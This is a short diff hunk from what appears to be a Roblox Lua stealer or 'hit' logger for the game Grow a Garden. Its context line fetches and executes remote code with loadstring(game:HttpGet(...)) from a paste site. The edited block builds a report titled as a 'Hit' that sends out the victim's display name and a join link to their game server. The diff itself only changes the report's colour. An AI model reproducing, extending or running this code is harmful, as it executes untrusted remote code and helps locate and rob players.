@@ -395,7 +395,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             embeds = {{
                 title = "Grow a Garden Hit - Scripts.SM",
                 url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 15105570,
+                color = 57855,
                 fields = {
                     {
                         name = "🪪 Display Name",
